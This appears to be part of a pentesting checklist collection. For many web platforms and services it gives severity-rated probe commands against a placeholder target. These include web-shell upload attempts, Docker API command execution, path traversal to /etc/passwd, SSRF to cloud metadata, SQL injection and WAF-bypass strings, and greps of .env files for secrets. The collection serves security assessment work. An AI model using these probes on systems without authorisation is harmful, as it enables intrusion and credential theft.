### Check for File Upload Vulnerabilities
**Severity: 🟠 High**
```bash
// Divi file upload endpoint
curl -s -F "file=@shell.php" "http://target.com/wp-admin/admin-ajax.php?action=et_pb_process_area"
```

**References:**
- https://www.elegantthemes.com/divi/

---

## Docker
<!-- id: docker | icon: 🛠️ | color: #e06c75 -->
Docker is a container platform. Exposed Docker API daemon (port 2375/2376) allows full host takeover.

### Check for Exposed Docker API
**Severity: 🔴 Critical**
```bash
// Docker API without TLS (2375) or with TLS (2376)
curl -s http://target.com:2375/version
curl -s https://target.com:2376/version
// List containers
curl -s http://target.com:2375/containers/json
```

### Check for Privileged Container Escape
**Severity: 🔴 Critical**
```bash
// Check for privileged mode in container info
curl -s http://target.com:2375/containers/json | jq '.[] | select(.HostConfig.Privileged==true)'
// Execute commands in a container
curl -s -X POST "http://target.com:2375/containers/CONTAINER_ID/exec" -H "Content-Type: application/json" -d '{"Cmd":["/bin/sh","-c","id"]}'
```

**References:**
- https://docs.docker.com/engine/security/

---

## DocuSign
<!-- id: docusign | icon: 🛠️ | color: #e06c75 -->
DocuSign is an e-signature platform. Exposed API keys and integration tokens can allow unauthorized signature requests.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for DocuSign API keys
curl -s http://target.com/app.js | grep -i "docusign\|api_key\|integration_key"
curl -s http://target.com/.env | grep -i "docusign"
```

**References:**
- https://developers.docusign.com/

---

## Dokeos
<!-- id: dokeos | icon: 🛠️ | color: #e06c75 -->
Dokeos is an open-source LMS platform. SQL injection, XSS, and file upload vulnerabilities have been found.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Dokeos common paths
curl -s http://target.com/dokeos/
curl -s http://target.com/main/
curl -s http://target.com/install/
```

**References:**
- https://www.dokeos.com/

---

## Drift
<!-- id: drift | icon: 🛠️ | color: #e06c75 -->
Drift is a conversational marketing and live chat platform. API key exposure is a concern.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Drift API keys in source
curl -s http://target.com/ | grep -i "drift\|drift_token"
curl -s http://target.com/app.js | grep -i "drift"
```

**References:**
- https://www.drift.com/

---

## Drip
<!-- id: drip | icon: 🛠️ | color: #e06c75 -->
Drip is an email marketing platform. Exposed API keys can allow unauthorized subscriber management.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Drip API keys
curl -s http://target.com/app.js | grep -i "drip\|api_key"
```

**References:**
- https://www.drip.com/

---

## Dropbox
<!-- id: dropbox | icon: 🛠️ | color: #e06c75 -->
Dropbox is a file hosting service. Exposed API tokens, shared link enumeration, and OAuth misconfigurations are concerns.

### Check for API Token Exposure
**Severity: 🔴 Critical**
```bash
// Search for Dropbox tokens in source
curl -s http://target.com/app.js | grep -i "dropbox\|db_\|sl\."
curl -s http://target.com/.env | grep -i "dropbox"
```

### Check for Exposed Shared Links
**Severity: 🟠 High**
```bash
// Try enumerating Dropbox shared links
curl -s "https://www.dropbox.com/s/AAAAAAAAAAA/file"
```

**References:**
- https://www.dropbox.com/developers/reference/security

---

## Duda
<!-- id: duda | icon: 🛠️ | color: #e06c75 -->
Duda is a website builder platform. Subdomain takeover and API endpoint exposure are concerns.

### Check for Subdomain Takeover
**Severity: 🟠 High**
```bash
// Check if Duda subdomain is vulnerable to takeover
dig CNAME app.target.com | grep -i "dudahosting\|duda"
// If CNAME points to Duda but the site is deleted, it's vulnerable
```

**References:**
- https://www.duda.co/

---

## Dynatrace
<!-- id: dynatrace | icon: 🛠️ | color: #e06c75 -->
Dynatrace is an application performance monitoring platform. Exposed API tokens and script integrity issues are concerns.

### Check for API Token Exposure
**Severity: 🔴 Critical**
```bash
// Search for Dynatrace API tokens
curl -s http://target.com/app.js | grep -i "dynatrace\|dt_"
curl -s http://target.com/.env | grep -i "dynatrace\|DT_API_TOKEN"
```

### Check for RUM Script Detection
**Severity: 🟡 Medium**
```bash
// Detect Dynatrace RUM
curl -s http://target.com/ | grep -i "dynatrace\|dtagent"
```

**References:**
- https://www.dynatrace.com/

---

## Elementor
<!-- id: elementor | icon: 🛠️ | color: #e06c75 -->
Elementor is a popular WordPress page builder. File upload bypass, stored XSS, and privilege escalation have been found.

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Elementor version detection
curl -s http://target.com/wp-content/plugins/elementor/readme.txt | grep -i "stable tag\|version"
```

### Check for File Upload Vulnerabilities
**Severity: 🟠 High**
```bash
// Elementor file upload endpoint
curl -s -F "file=@shell.php" "http://target.com/wp-admin/admin-ajax.php?action=elementor_upload_file"
```

**References:**
- https://elementor.com/

---

## Elgg
<!-- id: elgg | icon: 🛠️ | color: #e06c75 -->
Elgg is an open-source social networking platform. SQL injection, XSS, and authentication bypass have been found.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Elgg common paths
curl -s http://target.com/elgg/
curl -s http://target.com/admin/
curl -s http://target.com/install.php
```

**References:**
- https://elgg.org/

---

## EmbedThis Appweb
<!-- id: embedthis-appweb | icon: 🛠️ | color: #e06c75 -->
EmbedThis Appweb is an embedded web server. Directory traversal and authentication bypass have been found.

### Check for Server Header
**Severity: 🟡 Medium**
```bash
// Appweb identifies itself
curl -s -I http://target.com/ | grep -i "server\|appweb"
```

### Check for Directory Traversal
**Severity: 🟠 High**
```bash
// Test for path traversal
curl -s "http://target.com/../../../etc/passwd"
curl -s "http://target.com/..%252f..%252f..%252fetc/passwd"
```

**References:**
- https://www.embedthis.com/appweb/

---

## Ember.js
<!-- id: emberjs | icon: 🛠️ | color: #e06c75 -->
Ember.js is a JavaScript framework. Debug mode exposure and client-side template injection are concerns.

### Check for Debug Mode
**Severity: 🟡 Medium**
```bash
// Ember.js debug mode
curl -s http://target.com/ | grep -i "ember\|Ember"
curl -s http://target.com/assets/app.js | grep -i "EmberENV\|development"
```

**References:**
- https://emberjs.com/

---

## Envoy (Proxy)
<!-- id: envoy-proxy | icon: 🛠️ | color: #e06c75 -->
Envoy is a high-performance proxy. Exposed admin interface and configuration disclosure are concerns.

### Check for Admin Interface
**Severity: 🟠 High**
```bash
// Envoy admin endpoint (default port 9901)
curl -s http://target.com:9901/server_info
curl -s http://target.com:9901/config_dump
curl -s http://target.com:9901/stats
```

**References:**
- https://www.envoyproxy.io/

---

## ERPNext
<!-- id: erpnext | icon: 🛠️ | color: #e06c75 -->
ERPNext is an open-source ERP platform. SQL injection, authentication bypass, and file upload vulnerabilities have been found.

### Check for Exposed Login
**Severity: 🟡 Medium**
```bash
// ERPNext common paths
curl -s http://target.com/login
curl -s http://target.com/api/method/login
curl -s http://target.com/desk
```

**References:**
- https://erpnext.com/

---

## EspoCRM
<!-- id: espocrm | icon: 🛠️ | color: #e06c75 -->
EspoCRM is an open-source CRM platform. API endpoint exposure is a concern.

### Check for Exposed API
**Severity: 🟡 Medium**
```bash
// EspoCRM API endpoints
curl -s http://target.com/api/v1/
curl -s http://target.com/api/v1/User
curl -s http://target.com/client/
```

**References:**
- https://www.espocrm.com/

---

## Etherpad
<!-- id: etherpad | icon: 🛠️ | color: #e06c75 -->
Etherpad is a collaborative text editor. Exposed pads and RCE in older versions are concerns.

### Check for Exposed Pads
**Severity: 🟠 High**
```bash
// Etherpad common paths
curl -s http://target.com/p/
curl -s http://target.com/admin
```

### Check for API Exposure
**Severity: 🟠 High**
```bash
// Etherpad API
curl -s "http://target.com/api/1/listAllPads"
curl -s "http://target.com/api/1/getStats"
```

**References:**
- https://etherpad.org/

---

## Evernote
<!-- id: evernote | icon: 🛠️ | color: #e06c75 -->
Evernote is a note-taking platform. Exposed API keys can allow unauthorized access to notes.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Evernote API keys
curl -s http://target.com/app.js | grep -i "evernote\|api_key\|consumer_key"
```

**References:**
- https://dev.evernote.com/

---

## Exo Platform
<!-- id: exo-platform | icon: 🛠️ | color: #e06c75 -->
Exo Platform is an enterprise social collaboration platform. Authentication bypass and data exposure are concerns.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// Exo Platform common paths
curl -s http://target.com/portal/
curl -s http://target.com/rest/
curl -s http://target.com/platform/
```

**References:**
- https://www.exoplatform.com/

---

## ExactMetrics
<!-- id: exactmetrics | icon: 🛠️ | color: #e06c75 -->
ExactMetrics (formerly MonsterInsights) is a Google Analytics WordPress plugin. API key and token exposure are concerns.

### Check for API Key Exposure
**Severity: 🟡 Medium**
```bash
// Search for ExactMetrics keys
curl -s http://target.com/wp-content/plugins/google-analytics-dashboard-for-wp/ | head -5
```

**References:**
- https://www.exactmetrics.com/

---

## Erlang
<!-- id: erlang | icon: 🛠️ | color: #e06c75 -->
Erlang is a programming language/runtime. Erlang Cookie authentication bypass and exposed EPMD ports are security concerns.

### Check for Exposed EPMD
**Severity: 🟠 High**
```bash
// Erlang Port Mapper Daemon (epmd) default port 4369
curl -s http://target.com:4369/
// Check for Erlang distribution port
curl -s http://target.com:4369/names
```

**References:**
- https://www.erlang.org/

---

## Cybersource
<!-- id: cybersource | icon: 🛠️ | color: #e06c75 -->
Cybersource is a payment gateway platform. Exposed API keys and webhook secret leakage can allow payment tampering.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Cybersource API keys
curl -s http://target.com/app.js | grep -i "cybersource\|apiKey\|transaction_key"
curl -s http://target.com/.env | grep -i "cybersource\|CYBERSOURCE"
```

**References:**
- https://www.cybersource.com/

---

## DataDome
<!-- id: datadome | icon: 🛠️ | color: #e06c75 -->
DataDome is a bot protection service. Origin IP bypass and custom rule bypass are common objectives.

### Check for Origin IP Discovery
**Severity: 🟡 Medium**
```bash
// Find real origin IP behind DataDome
curl -s -I https://target.com/ | grep -i "server\|x-forwarded"
nslookup target.com
```

**References:**
- https://datadome.co/

---

## Dancer
<!-- id: dancer | icon: 🛠️ | color: #e06c75 -->
Dancer is a Perl web framework. Debug mode and version disclosure are common findings.

### Check for Debug Mode
**Severity: 🟡 Medium**
```bash
// Dancer shows version info in error pages
curl -s "http://target.com/nonexistent"
curl -s -I http://target.com/ | grep -i "server\|perl\|dancer"
```

**References:**
- https://www.perldancer.org/

---

## DevExtreme
<!-- id: devextreme | icon: 🛠️ | color: #e06c75 -->
DevExtreme is a UI component library. Its presence may indicate admin dashboards or internal tools.

### Check for Exposed Admin Dashboards
**Severity: 🟡 Medium**
```bash
// DevExtreme common paths
curl -s http://target.com/devextreme/
curl -s http://target.com/Content/devextreme/
```

**References:**
- https://js.devexpress.com/

---

## Django CMS
<!-- id: django-cms | icon: 🛠️ | color: #e06c75 -->
Django CMS is a Django-based CMS platform. SQL injection, XSS, and admin exposure have been found.

### Check for Exposed Admin
**Severity: 🟡 Medium**
```bash
// Django CMS admin paths
curl -s http://target.com/admin/
curl -s http://target.com/cms/
```

**References:**
- https://www.django-cms.org/

---

## Dwolla
<!-- id: dwolla | icon: 🛠️ | color: #e06c75 -->
Dwolla is a payment platform. Exposed API keys and webhook secrets can allow unauthorized transactions.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Dwolla API keys
curl -s http://target.com/app.js | grep -i "dwolla\|api_key\|access_token"
curl -s http://target.com/.env | grep -i "dwolla"
```

**References:**
- https://www.dwolla.com/

---

## Dynamic Yield
<!-- id: dynamic-yield | icon: 🛠️ | color: #e06c75 -->
Dynamic Yield is a personalization platform. Client-side script integrity and API key exposure are concerns.

### Check for Script Integrity
**Severity: 🟡 Medium**
```bash
// Detect Dynamic Yield
curl -s http://target.com/ | grep -i "dynamicyield\|DY"
```

**References:**
- https://www.dynamicyield.com/

---

## EZproxy
<!-- id: ezproxy | icon: 🛠️ | color: #e06c75 -->
EZproxy is a proxy/authentication service used by libraries. Exposed admin interfaces and credential leakage are concerns.

### Check for Exposed Admin
**Severity: 🟡 Medium**
```bash
// EZproxy common paths
curl -s http://target.com/admin/
curl -s http://target.com/ezproxy/
```

**References:**
- https://www.oclc.org/en/ezproxy.html

---

## Ecwid
<!-- id: ecwid | icon: 🛠️ | color: #e06c75 -->
Ecwid is an e-commerce platform. API key exposure and price manipulation are concerns.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Ecwid API keys
curl -s http://target.com/app.js | grep -i "ecwid\|api_key"
```

**References:**
- https://www.ecwid.com/

---

## EdgeCast (Verizon CDN)
<!-- id: edgecast | icon: 🛠️ | color: #e06c75 -->
EdgeCast is a CDN service (now Verizon/Edgio). Origin IP discovery and cache poisoning are common objectives.

### Check for Origin IP Discovery
**Severity: 🟡 Medium**
```bash
// Find real origin behind EdgeCast CDN
curl -s -I https://target.com/ | grep -i "server\|x-forwarded"
nslookup target.com
```

**References:**
- https://www.verizon.com/business/products/cdn/

---

## Edgio
<!-- id: edgio | icon: 🛠️ | color: #e06c75 -->
Edgio (formerly Limelight/EdgeCast) is a CDN platform. Origin bypass and cache poisoning are concerns.

### Check for Origin IP
**Severity: 🟡 Medium**
```bash
// Find origin behind Edgio
curl -s -I https://target.com/ | grep -i "server\|x-forwarded"
nslookup target.com
```

**References:**
- https://edg.io/

---

## Ektron CMS
<!-- id: ektron-cms | icon: 🛠️ | color: #e06c75 -->
Ektron CMS (now Episerver) is a .NET CMS platform. SQL injection, XSS, and file upload bypass have been found.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// Ektron common paths
curl -s http://target.com/ektron/
curl -s http://target.com/Ektron/
curl -s http://target.com/WorkArea/
```

**References:**
- https://www.episerver.com/

---

## Easy Digital Downloads
<!-- id: easy-digital-downloads | icon: 🛠️ | color: #e06c75 -->
Easy Digital Downloads is a WordPress e-commerce plugin. SQL injection and price manipulation have been found.

### Check for Version
**Severity: 🟡 Medium**
```bash
// EDD version detection
curl -s http://target.com/wp-content/plugins/easy-digital-downloads/readme.txt | grep -i "stable tag\|version"
```

**References:**
- https://easydigitaldownloads.com/

---

## EasyEngine
<!-- id: easyengine | icon: 🛠️ | color: #e06c75 -->
EasyEngine is a WordPress management tool. Misconfigured sites and credential leakage are concerns.

### Check for Server Info
**Severity: 🟡 Medium**
```bash
// EasyEngine reveals itself in headers
curl -s -I http://target.com/ | grep -i "server\|x-powered-by"
```

**References:**
- https://easyengine.io/

---

## Django
<!-- id: django | icon: 🛠️ | color: #e06c75 -->
Django is a popular Python web framework. SQL injection, XSS, CSRF bypass, and misconfigured debug mode are common findings.

### Check for DEBUG Mode
**Severity: 🔴 Critical**
```bash
// Django debug mode exposes settings
curl -s http://target.com/nonexistent | grep -i "debug\|settings\|SECRET_KEY\|DATABASE"
curl -s http://target.com/settings/
```

### Test for SQL Injection
**Severity: 🔴 Critical**
```bash
// Django raw queries or misuse of extra()
curl -s "http://target.com/api/users/?id=1' OR '1'='1"
curl -s "http://target.com/search/?q=test'--"
```

### Check for Exposed Admin
**Severity: 🟠 High**
```bash
// Django admin panel
curl -s -o /dev/null -w "%{http_code}" http://target.com/admin/
curl -s -o /dev/null -w "%{http_code}" http://target.com/admin/login/
```

**References:**
- https://www.djangoproject.com/
- https://docs.djangoproject.com/en/stable/topics/security/

---

## Discourse
<!-- id: discourse | icon: 🛠️ | color: #e06c75 -->
Discourse is a popular open-source discussion platform. SSRF, authentication bypass, and rate limiting issues have been found.

### Check for SSRF
**Severity: 🟠 High**
```bash
// Discourse SSRF via onebox
curl -s "http://target.com/onebox?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://target.com/onebox?url=file:///etc/passwd"
```

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// Discourse common paths
curl -s http://target.com/admin/
curl -s http://target.com/sidekiq/
curl -s http://target.com/logs/
curl -s -I http://target.com/ | grep -i "x-discourse"
```

**References:**
- https://www.discourse.org/
- https://github.com/discourse/discourse

---

## Drupal
<!-- id: drupal | icon: 🛠️ | color: #e06c75 -->
Drupal is a leading PHP CMS. SQL injection, XSS, and authentication bypass have been found. Drupalgeddon vulnerabilities are critical.

### Check for Version Disclosure
**Severity: 🟠 High**
```bash
// Drupal version detection
curl -s http://target.com/core/CHANGELOG.txt | head -20
curl -s -I http://target.com/ | grep -i "x-generator\|x-drupal"
curl -s http://target.com/node/1
```

### Check for Drupalgeddon (SA-CORE-2018-004/CVE-2018-7600)
**Severity: 🔴 Critical**
```bash
// Drupalgeddon 2 RCE check
curl -s "http://target.com/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" | grep -i "exception\|error"
```

### Check for Exposed Admin
**Severity: 🟡 Medium**
```bash
// Drupal admin paths
curl -s http://target.com/user/login/
curl -s http://target.com/admin/
curl -s http://target.com/admin/config/
```

**References:**
- https://www.drupal.org/
- https://www.drupal.org/sa-core-2018-004

---

## Drupal Commerce
<!-- id: drupal-commerce | icon: 🛠️ | color: #e06c75 -->
Drupal Commerce is an e-commerce module for Drupal. Price manipulation and broken access control are common.

### Check for Price Manipulation
**Severity: 🟠 High**
```bash
// Intercept and modify price/quantity parameters
curl -s "http://target.com/cart/add?product_id=1&price=0.01"
```

**References:**
- https://www.drupalcommerce.org/

---

## Drupal Multisite
<!-- id: drupal-multisite | icon: 🛠️ | color: #e06c75 -->
Drupal Multisite runs multiple sites from one codebase. Cross-site contamination and config leakage are concerns.

### Check for Cross-Site Database Access
**Severity: 🟠 High**
```bash
// Test for multisite config exposure
curl -s http://target.com/sites/site1/settings.php
curl -s http://target.com/sites/default/settings.php
```

**References:**
- https://www.drupal.org/docs/multisite

---

## Dart
<!-- id: dart | icon: 🛠️ | color: #e06c75 -->
Dart is a programming language by Google (used in Flutter). Exposed Dart/Flutter apps may leak API keys and source code.

### Check for Source Map Exposure
**Severity: 🟠 High**
```bash
// Flutter/Dart web source maps
curl -s http://target.com/main.dart.js.map
curl -s http://target.com/main.dart.js
curl -s http://target.com/dart/
```

**References:**
- https://dart.dev/

---

## DataTables
<!-- id: datatables | icon: 🛠️ | color: #e06c75 -->
DataTables is a jQuery table plugin. Its presence often reveals admin dashboards with internal data exposure.

### Check for Exposed Endpoints
**Severity: 🟡 Medium**
```bash
// DataTables uses server-side processing endpoints
curl -s http://target.com/api/data/ | grep -i "data\|recordsTotal\|draw"
```

**References:**
- https://datatables.net/

---

## DatoCMS
<!-- id: datocms | icon: 🛠️ | color: #e06c75 -->
DatoCMS is a headless CMS platform. API token exposure and GraphQL introspection are concerns.

### Check for GraphQL Introspection
**Severity: 🟡 Medium**
```bash
// GraphQL introspection query
curl -s -X POST http://target.com/graphql -H "Content-Type: application/json" -d '{"query":"query { __schema { types { name fields { name } } } }"}'
```

**References:**
- https://www.datocms.com/

---

## Doxygen
<!-- id: doxygen | icon: 🛠️ | color: #e06c75 -->
Doxygen is a documentation generator. Exposed generated docs often reveal internal architecture and API details.

### Check for Generated Docs
**Severity: 🟡 Medium**
```bash
// Doxygen output paths
curl -s http://target.com/docs/
curl -s http://target.com/documentation/html/
curl -s http://target.com/doxygen/html/
```

**References:**
- https://www.doxygen.nl/

---

## ECharts
<!-- id: echarts | icon: 🛠️ | color: #e06c75 -->
ECharts is a data visualization library by Baidu. Its presence may reveal analytics dashboards and internal data.

### Check for Dashboard Exposure
**Severity: 🟡 Medium**
```bash
// Detect ECharts
curl -s http://target.com/ | grep -i "echarts\|ecStat"
```

**References:**
- https://echarts.apache.org/

---

## Episerver (Optimizely)
<!-- id: episerver | icon: 🛠️ | color: #e06c75 -->
Episerver (now Optimizely) is a .NET CMS platform. SQL injection, XSS, and file upload vulnerabilities have been found.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// Episerver common paths
curl -s http://target.com/EPiServer/
curl -s http://target.com/App_Themes/
curl -s http://target.com/App_Data/
```

**References:**
- https://www.optimizely.com/

---

## Express.js
<!-- id: express-js | icon: 🛠️ | color: #e06c75 -->
Express.js is the most popular Node.js web framework. Misconfigured CORS, rate limiting bypass, and header injection are common.

### Check for CORS Misconfiguration
**Severity: 🟠 High**
```bash
// Test CORS policy
curl -s -I -H "Origin: https://evil.com" http://target.com/api/ | grep -i "access-control"
```

### Check for Security Headers
**Severity: 🟡 Medium**
```bash
// Check for missing security headers
curl -s -I http://target.com/ | grep -i "x-frame-options\|x-content-type-options\|content-security-policy\|strict-transport-security"
```

### Check for Rate Limiting
**Severity: 🟡 Medium**
```bash
// Test if rate limiting is enabled
for ($i=0; $i -lt 100; $i++) { curl -s -o /dev/null -w "%{http_code} " http://target.com/api/ }
```

**References:**
- https://expressjs.com/
- https://expressjs.com/en/advanced/best-practice-security.html

---

## FastAPI
<!-- id: fastapi | icon: 🛠️ | color: #e06c75 -->
Security checklists for FastAPI Python web framework.

### Check for exposed OpenAPI/Swagger docs in production
<!-- id: fastapi-1 | severity: high | tags: fastapi, openapi, info-disclosure -->
FastAPI automatically generates OpenAPI docs at /docs and /redoc. Leaving these enabled in production exposes the full API surface.

**Commands:**
```bash
curl -s http://target.com/docs
curl -s http://target.com/redoc
curl -s http://target.com/openapi.json
```

**References:**
- https://fastapi.tiangolo.com/how-to/extending-openapi/

### Check FastAPI for CORS misconfiguration
<!-- id: fastapi-2 | severity: high | tags: fastapi, cors, misconfiguration -->
Wide-open CORS policies on FastAPI backends allow cross-origin data theft from SPA frontends.

**Commands:**
```bash
curl -sI -H "Origin: https://evil.com" http://target.com/ | grep -i access-control
```

**References:**
- https://fastapi.tiangolo.com/tutorial/cors/

### Check FastAPI for debug mode enabled
<!-- id: fastapi-3 | severity: medium | tags: fastapi, debug, info-disclosure -->
FastAPI with debug=True returns detailed tracebacks exposing source code and environment variables.

**Commands:**
```bash
curl -s http://target.com/nonexistent-path | grep -i "traceback\|error\|file\|line"
```

**References:**
- https://fastapi.tiangolo.com/deployment/

---

## Fastly
<!-- id: fastly | icon: 🛠️ | color: #e06c75 -->
Security checklists for Fastly CDN and edge cloud platform.

### Check for origin IP exposure behind Fastly
<!-- id: fastly-1 | severity: high | tags: fastly, origin-exposure, cdn -->
Bypass Fastly WAF and caching by discovering the origin server IP via certificate transparency logs or DNS history.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
dig target.com +short
```

**References:**
- https://docs.fastly.com/en/guides/working-with-origins

### Check for Fastly VCL/purge authentication bypass
<!-- id: fastly-2 | severity: high | tags: fastly, purge, cache-poisoning -->
Fastly purge requests require authentication. Exposed API tokens or misconfigured ACLs allow cache poisoning and defacement.

**Commands:**
```bash
curl -X PURGE https://target.com/path -H "Fastly-Key: YOUR_API_KEY"
```

**References:**
- https://docs.fastly.com/en/guides/using-purge

### Check for Fastly WAF bypass techniques
<!-- id: fastly-3 | severity: medium | tags: fastly, waf-bypass, edge -->
Test for WAF bypass using HTTP parameter pollution, encoding tricks, and header manipulation.

**Commands:**
```bash
curl -k "https://target.com/page?id=1&id=2' OR '1'='1"
curl -k "https://target.com/page?id=1%00' OR 1=1 --"
```

**References:**
- https://portswigger.net/web-security/waf/bypassing

---

## Firebase
<!-- id: firebase | icon: 🛠️ | color: #e06c75 -->
Security checklists for Google Firebase backend-as-a-service platform.

### Check for Firebase with unsecured read/write rules
<!-- id: firebase-1 | severity: critical | tags: firebase, firestore, realtime-database, data-exposure -->
Firebase Realtime Database or Firestore with `".read": true, ".write": true` rules exposes all data to anyone on the internet.

**Commands:**
```bash
curl -s "https://PROJECT_ID.firebaseio.com/.json"
curl -s "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents"
```

**References:**
- https://firebase.google.com/docs/rules

### Check for Firebase API key exposure in client code
<!-- id: firebase-2 | severity: high | tags: firebase, api-key, info-disclosure -->
Firebase API keys embedded in mobile apps or JavaScript are inherently public. Verify that security rules — not the API key — protect your data.

**Commands:**
```bash
grep -r "firebase" /path/to/app.js | grep -oE '"apiKey":\s*"[^"]+"'
```

**References:**
- https://firebase.google.com/docs/projects/security

### Check for Firebase Authentication misconfiguration
<!-- id: firebase-3 | severity: medium | tags: firebase, auth, enumeration -->
Firebase Auth with email/password sign-in enabled allows user enumeration via sign-in method errors.

**Commands:**
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=API_KEY" -H "Content-Type: application/json" -d '{"email":"test@test.com","password":"wrong","returnSecureToken":true}'
```

**References:**
- https://firebase.google.com/docs/auth

---

## Flutter
<!-- id: flutter | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flutter cross-platform mobile framework applications.

### Check Flutter for exposed API keys and secrets in Dart code
<!-- id: flutter-1 | severity: high | tags: flutter, mobile, secrets, reverse-engineering -->
Flutter apps compiled in release mode can still have hardcoded API keys and secrets extracted from the Dart snapshot or asset bundles.

**Commands:**
```bash
// Extract strings from Flutter app bundle
strings app.apk | grep -i "api_key\|secret\|token\|password"
// Use flutter extract tool
flutter analyze --no-pub
```

**References:**
- https://flutter.dev/docs/security

### Check Flutter for insecure local data storage
<!-- id: flutter-2 | severity: medium | tags: flutter, local-storage, sqflite, shared-preferences -->
Flutter apps using SharedPreferences or SQLite without encryption expose sensitive user data on rooted/jailbroken devices.

**Commands:**
```bash
// Check for insecure storage on rooted device
adb shell cat /data/data/com.target.app/shared_prefs/*.xml
```

**References:**
- https://flutter.dev/docs/cookbook/persistence

### Check Flutter web app for source map exposure
<!-- id: flutter-3 | severity: medium | tags: flutter, web, source-map, info-disclosure -->
Flutter web builds may include Dart source maps exposing original application logic and embedded secrets.

**Commands:**
```bash
curl -s http://target.com/main.dart.js.map
curl -s http://target.com/main.dart.js
```

**References:**
- https://flutter.dev/multi-platform/web

---

## Font Awesome
<!-- id: font-awesome | icon: 🛠️ | color: #e06c75 -->
Security checklists for Font Awesome icon toolkit — primarily about license key exposure and CDN data leakage.

### Check for exposed Font Awesome Pro license key
<!-- id: font-awesome-1 | severity: medium | tags: font-awesome, license-key, info-disclosure -->
Exposed Font Awesome Pro license keys embedded in source code or package.json can be harvested and reused.

**Commands:**
```bash
grep -r "fontawesome" /var/www/ | grep -i "pro\|token\|license\|key"
```

**References:**
- https://fontawesome.com/docs/web/setup/hosting

### Check for Font Awesome CDN tracking
<!-- id: font-awesome-2 | severity: low | tags: font-awesome, cdn, tracking -->
Font Awesome CDN links in production may leak visitor data to Font Awesome's analytics.

**Commands:**
```bash
curl -s http://target.com | grep -i "fontawesome"
```

**References:**
- https://fontawesome.com/docs/web/setup/hosting

---

## Framer Sites / Framer Motion
<!-- id: framer | icon: 🛠️ | color: #e06c75 -->
Security checklists for Framer website builder and animation library.

### Check Framer sites for exposed site settings and API tokens
<!-- id: framer-1 | severity: medium | tags: framer, cms, info-disclosure -->
Framer-published sites may leak CMS content API tokens in client-side JavaScript.

**Commands:**
```bash
curl -s http://target.com | grep -i "framer\|framer\.site"
// Look for embedded API tokens in the page source
```

### Check for exposed CMS draft content
<!-- id: framer-2 | severity: medium | tags: framer, cms, draft-exposure -->
Framer CMS draft content may be accessible if preview URLs are predictable or not properly protected.

**References:**
- https://www.framer.com/

---

## FreeBSD
<!-- id: freebsd | icon: 🛠️ | color: #e06c75 -->
Security checklists for FreeBSD Unix operating system.

### Check FreeBSD for exposed SSH and service ports
<!-- id: freebsd-1 | severity: high | tags: freebsd, ssh, exposure -->
FreeBSD servers exposed on the internet are vulnerable to credential brute-forcing and service attacks if hardened.

**Commands:**
```bash
nmap -sV -p 22,80,443 target.com
// Check for default passwords on common services
```

### Check FreeBSD for kernel and package vulnerabilities
<!-- id: freebsd-2 | severity: high | tags: freebsd, vuln-scan, packages -->
Outdated FreeBSD kernel or pkg packages may have known CVEs.

**Commands:**
```bash
freebsd-version -k
pkg audit -F
```

**References:**
- https://www.freebsd.org/security/

### Check FreeBSD for unsecured jail or ZFS permissions
<!-- id: freebsd-3 | severity: medium | tags: freebsd, jail, zfs, container-escape -->
Misconfigured FreeBSD jails may allow container escape via shared ZFS datasets or improperly restricted sysctls.

**References:**
- https://docs.freebsd.org/en/books/handbook/jails/

---

## FullStory
<!-- id: fullstory | icon: 🛠️ | color: #e06c75 -->
Security checklists for FullStory session replay analytics.

### Check FullStory for sensitive data recording
<!-- id: fullstory-1 | severity: high | tags: fullstory, session-replay, pii-leakage -->
FullStory records all user interactions including form inputs. Without proper data obfuscation rules, passwords, credit cards, and PII may be captured and stored.

**Commands:**
```bash
// Check for FullStory script in page source
curl -s http://target.com | grep -i "fullstory"
// Inspect for data-fs-mask or data-fs-exclude attributes
```

**References:**
- https://help.fullstory.com/hc/en-us/articles/360020623574

### Check for FullStory API key exposure
<!-- id: fullstory-2 | severity: medium | tags: fullstory, api-key, data-access -->
Exposed FullStory API keys allow unauthorized access to session recordings and user data.

**Commands:**
```bash
grep -r "fullstory" /var/www/ | grep -i "key\|token\|secret"
```

**References:**
- https://developer.fullstory.com/

---

## Flarum
<!-- id: flarum | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flarum open-source forum software.

### Check Flarum for exposed admin panel
<!-- id: flarum-1 | severity: high | tags: flarum, admin, unauthorized-access -->
Flarum admin panel at /admin with weak credentials allows full forum control including template modification and code injection.

**Commands:**
```bash
curl -s http://target.com/admin
```

**References:**
- https://docs.flarum.org/extend/security/

### Check Flarum for XSS in post content
<!-- id: flarum-2 | severity: high | tags: flarum, xss, forum -->
Flarum allows HTML in posts; insufficient sanitization may lead to stored XSS.

**Commands:**
```bash
// Post <script>alert(1)</script> in a forum post to test
```

**References:**
- https://docs.flarum.org/extend/security/

### Check Flarum for CSRF vulnerabilities
<!-- id: flarum-3 | severity: medium | tags: flarum, csrf -->
Flarum uses CSRF tokens; verify they are properly enforced on all state-changing operations.

**References:**
- https://docs.flarum.org/extend/api/

---

## Figma
<!-- id: figma | icon: 🛠️ | color: #e06c75 -->
Security checklists for Figma design collaboration platform.

### Check for exposed Figma access tokens
<!-- id: figma-1 | severity: high | tags: figma, access-token, design-data -->
Exposed Figma personal access tokens in source code, env files, or CI/CD configs allow unauthorized access to all design files and team data.

